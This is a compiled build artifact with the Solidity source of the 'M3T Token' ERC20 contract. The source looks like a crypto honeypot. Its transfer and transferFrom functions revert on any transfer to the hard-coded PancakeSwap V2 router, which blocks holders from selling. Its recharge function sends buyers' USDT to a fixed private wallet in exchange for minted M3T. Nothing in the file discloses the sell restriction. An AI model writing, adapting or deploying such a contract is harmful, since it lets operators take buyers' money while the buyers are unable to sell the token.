{
  "contractName": "M3tToken",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "USDT_TOKEN",
      "outputs": [
        {
          "internalType": "contract IERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "subtractedValue",
          "type": "uint256"
        }
      ],
      "name": "decreaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "addedValue",
          "type": "uint256"
        }
      ],
      "name": "increaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "recharge",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60a0604052600580546001600160a01b03199081167310ed43c718714eb63d5aa57b78b54704e256024e17909155600680549091167352ed09d15c0d29ec26b80a09a901ecf4896c287e1790553480156200005957600080fd5b50604051620010f4380380620010f48339810160408190526200007c91620004b8565b604051806040016040528060098152602001682699aa102a37b5b2b760b91b81525060405180604001604052806003815260200162134cd560ea1b8152508160039080519060200190620000d292919062000412565b508051620000e890600490602084019062000412565b5050506001600160a01b0381166080526200010f306aa2b525feca0bec58e000006200032a565b6200013873442e5c9884109091521215887ae01cfc19e08f136828a857425466f800006200032a565b620001617380f4a1bf5583f7e13dbae7fe2b18591e3d7c71316826c29e47c4844c00006200032a565b6200018a73033e36db77c6cfa25b243e98cadf15a76e360039680f0425b0641f3400006200032a565b620001b373c8fc095d136ab3b184bd92fbb52721ac34650e52680de0b6b3a7640000006200032a565b620001dc73e60dbb6d9747fca34adfc1adb23401d56047990c680d8d726b7177a800006200032a565b62000205733893aaf0172343cb9cfdd6049836730e80973517680d8d726b7177a800006200032a565b6200022e73ff49b9b9a71454aac7516501941f9bf4602cdfc9680c328093e61ee400006200032a565b6200025773ed66fa4e1944c14a05284b501bcf9eadb8d698b7680821ab0d44149800006200032a565b6200028073a9dfb5e987abe5e18b2f322003663d772610f6d56806659436cf281800006200032a565b620002a9739b5e60f7b4328a2e3bd0e61d999f180210d335796802b5e3af16b18800006200032a565b620002d2738cedae2f4d300131c0b352cdecad305aa56e2c096802a802f8630a2400006200032a565b620002fb73f461d24397aafe8ad582b2c407fbed5467d8d22368015af1d78b58c400006200032a565b6200032373c8fc095d136ab3b184bd92fbb52721ac34650e526753444835ec5800006200032a565b506200054e565b6001600160a01b038216620003855760405162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015260640160405180910390fd5b8060026000828254620003999190620004ea565b90915550506001600160a01b03821660009081526020819052604081208054839290620003c8908490620004ea565b90915550506040518181526001600160a01b038316906000907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a35050565b828054620004209062000511565b90600052602060002090601f0160209004810192826200044457600085556200048f565b82601f106200045f57805160ff19168380011785556200048f565b828001600101855582156200048f579182015b828111156200048f57825182559160200191906001019062000472565b506200049d929150620004a1565b5090565b5b808211156200049d5760008155600101620004a2565b600060208284031215620004cb57600080fd5b81516001600160a01b0381168114620004e357600080fd5b9392505050565b600082198211156200050c57634e487b7160e01b600052601160045260246000fd5b500190565b600181811c908216806200052657607f821691505b602082108114156200054857634e487b7160e01b600052602260045260246000fd5b50919050565b608051610b83620005716000396000818161018a015261052f0152610b836000f3fe608060405234801561001057600080fd5b50600436106100cf5760003560e01c806370a082311161008c578063a457c2d711610066578063a457c2d7146101cc578063a9059cbb146101df578063dd62ed3e146101f2578063ef299b0b1461022b57600080fd5b806370a082311461015c57806377b330c91461018557806395d89b41146101c457600080fd5b806306fdde03146100d4578063095ea7b3146100f257806318160ddd1461011557806323b872dd14610127578063313ce5671461013a5780633950935114610149575b600080fd5b6100dc610240565b6040516100e9919061095e565b60405180910390f35b6101056101003660046109cf565b6102d2565b60405190151581526020016100e9565b6002545b6040519081526020016100e9565b6101056101353660046109f9565b6102e8565b604051601281526020016100e9565b6101056101573660046109cf565b61039d565b61011961016a366004610a35565b6001600160a01b031660009081526020819052604090205490565b6101ac7f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b0390911681526020016100e9565b6100dc6103d9565b6101056101da3660046109cf565b6103e8565b6101056101ed3660046109cf565b610481565b610119610200366004610a57565b6001600160a01b03918216600090815260016020908152604080832093909416825291909152205490565b61023e610239366004610a8a565b6104aa565b005b60606003805461024f90610aa3565b80601f016020809104026020016040519081016040528092919081815260200182805461027b90610aa3565b80156102c85780601f1061029d576101008083540402835291602001916102c8565b820191906000526020600020905b8154815290600101906020018083116102ab57829003601f168201915b5050505050905090565b60006102df33848461066b565b50600192915050565b6005546000906001600160a01b038481169116141561030657600080fd5b61031184848461078f565b600061031d8533610200565b9050828110156103855760405162461bcd60e51b815260206004820152602860248201527f45524332303a207472616e7366657220616d6f756e74206578636565647320616044820152676c6c6f77616e636560c01b60648201526084015b60405180910390fd5b610392853385840361066b565b506001949350505050565b3360008181526001602090815260408083206001600160a01b038716845290915281205490916102df9185906103d4908690610af4565b61066b565b60606004805461024f90610aa3565b3360009081526001602090815260408083206001600160a01b03861684529091528120548281101561046a5760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77604482015264207a65726f60d81b606482015260840161037c565b610477338585840361066b565b5060019392505050565b6005546000906001600160a01b038481169116141561049f57600080fd5b6102df33848461078f565b600081116104eb5760405162461bcd60e51b815260206004820152600e60248201526d105b5bdd5b9d08125b9d985b1a5960921b604482015260640161037c565b60006104f8826019610b0c565b6006546040516323b872dd60e01b81523360048201526001600160a01b0391821660248201526044810185905291925083916000917f000000000000000000000000000000000000000000000000000000000000000016906323b872dd90606401602060405180830381600087803b15801561057357600080fd5b505af1158015610587573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105ab9190610b2b565b9050806105ed5760405162461bcd60e51b815260206004820152601060248201526f151c985b9cd9995c88125b9d985b1a5960821b604482015260640161037c565b60405163a9059cbb60e01b815233600482015260248101849052309063a9059cbb90604401602060405180830381600087803b15801561062c57600080fd5b505af1158015610640573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106649190610b2b565b5050505050565b6001600160a01b0383166106cd5760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b606482015260840161037c565b6001600160a01b03821661072e5760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b606482015260840161037c565b6001600160a01b0383811660008181526001602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b0383166107f35760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b606482015260840161037c565b6001600160a01b0382166108555760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b606482015260840161037c565b6001600160a01b038316600090815260208190526040902054818110156108cd5760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604482015265616c616e636560d01b606482015260840161037c565b6001600160a01b03808516600090815260208190526040808220858503905591851681529081208054849290610904908490610af4565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161095091815260200190565b60405180910390a350505050565b600060208083528351808285015260005b8181101561098b5785810183015185820160400152820161096f565b8181111561099d576000604083870101525b50601f01601f1916929092016040019392505050565b80356001600160a01b03811681146109ca57600080fd5b919050565b600080604083850312156109e257600080fd5b6109eb836109b3565b946020939093013593505050565b600080600060608486031215610a0e57600080fd5b610a17846109b3565b9250610a25602085016109b3565b9150604084013590509250925092565b600060208284031215610a4757600080fd5b610a50826109b3565b9392505050565b60008060408385031215610a6a57600080fd5b610a73836109b3565b9150610a81602084016109b3565b90509250929050565b600060208284031215610a9c57600080fd5b5035919050565b600181811c90821680610ab757607f821691505b60208210811415610ad857634e487b7160e01b600052602260045260246000fd5b50919050565b634e487b7160e01b600052601160045260246000fd5b60008219821115610b0757610b07610ade565b500190565b6000816000190483118215151615610b2657610b26610ade565b500290565b600060208284031215610b3d57600080fd5b81518015158114610a5057600080fdfea2646970667358221220a6e6f0e31d9707bb7cb1b571ca430a72e54ec9e7f318f419a15ca2a53d274d1364736f6c63430008090033",
  "immutableReferences": {
    "6527": [
      {
        "length": 32,
        "start": 394
      },
      {
        "length": 32,
        "start": 1327
      }
    ]
  },
  "source": "// SPDX-License-Identifier: SimPL-2.0\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract M3tToken is ERC20 {\n    IERC20 immutable public USDT_TOKEN;\n    address _pancakeswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n    address _wallet = 0x52ED09D15C0d29eC26b80a09a901EcF4896C287e;\n\n    constructor(address _token) ERC20(\"M3T Token\", \"M3T\") {\n        USDT_TOKEN = IERC20(_token);\n        _mint(address(this), 196701432e18);\n        _mint(address(0x442E5C9884109091521215887ae01cFc19e08F13), 750e18);\n        _mint(address(0x80f4A1Bf5583f7E13dBae7Fe2b18591E3D7c7131), 715e18);\n        _mint(address(0x033E36DB77C6Cfa25b243E98CADf15a76E360039), 277e18);\n        _mint(address(0xc8fc095D136aB3B184bD92fbb52721Ac34650E52), 256e18);\n        _mint(address(0xe60Dbb6D9747fca34aDFc1adB23401d56047990c), 250e18);\n        _mint(address(0x3893aaF0172343cb9cfdD6049836730e80973517), 250e18);\n        _mint(address(0xff49B9b9A71454aAc7516501941f9BF4602CDFC9), 225e18);\n        _mint(address(0xED66fA4e1944c14A05284b501BcF9eAdB8D698b7), 150e18);\n        _mint(address(0xA9dFb5e987abE5E18B2F322003663d772610F6D5), 118e18);\n        _mint(address(0x9B5E60F7b4328a2E3Bd0e61D999f180210D33579), 50e18);\n        _mint(address(0x8cEDAE2f4D300131c0B352cdECAd305aA56E2C09), 49e18);\n        _mint(address(0xF461d24397aafe8aD582B2C407FbeD5467d8D223), 25e18);\n        _mint(address(0xc8fc095D136aB3B184bD92fbb52721Ac34650E52), 6e18);\n    }\n\n    function recharge(uint256 amount) external {\n        require(amount > 0, \"Amount Invalid\");\n        uint256 m3t = amount * 25;\n        uint256 usdt = amount;\n\n        bool success = USDT_TOKEN.transferFrom(\n            msg.sender, _wallet, usdt\n        );\n        require(success, \"Transfer Invalid\");\n        IERC20(address(this)).transfer(msg.sender, m3t);\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        require(recipient != _pancakeswapV2Router);\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        require(recipient != _pancakeswapV2Router);\n        _transfer(sender, recipient, amount);\n        uint256 currentAllowance = allowance(sender, _msgSender());\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        unchecked {\n            _approve(sender, _msgSender(), currentAllowance - amount);\n        }\n\n        return true;\n    }\n}",
  "sourcePath": "/Users/hy/new-rich-contract/contracts/M3tToken.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.9+commit.e5eed63a.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2022-02-22T14:19:16.376Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {
      "allowance(address,address)": {
        "details": "See {IERC20-allowance}."
      },
      "approve(address,uint256)": {
        "details": "See {IERC20-approve}. Requirements: - `spender` cannot be the zero address."
      },
      "balanceOf(address)": {
        "details": "See {IERC20-balanceOf}."
      },
      "decimals()": {
        "details": "Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5.05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the value {ERC20} uses, unless this function is overridden; NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."
      },
      "decreaseAllowance(address,uint256)": {
        "details": "Atomically decreases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address. - `spender` must have allowance for the caller of at least `subtractedValue`."
      },
      "increaseAllowance(address,uint256)": {
        "details": "Atomically increases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address."
      },
      "name()": {
        "details": "Returns the name of the token."
      },
      "symbol()": {
        "details": "Returns the symbol of the token, usually a shorter version of the name."
      },
      "totalSupply()": {
        "details": "See {IERC20-totalSupply}."
      },
      "transfer(address,uint256)": {
        "details": "See {IERC20-transfer}. Requirements: - `recipient` cannot be the zero address. - the caller must have a balance of at least `amount`."
      },
      "transferFrom(address,address,uint256)": {
        "details": "See {IERC20-transferFrom}. Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}. Requirements: - `sender` and `recipient` cannot be the zero address. - `sender` must have a balance of at least `amount`. - the caller must have allowance for ``sender``'s tokens of at least `amount`."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}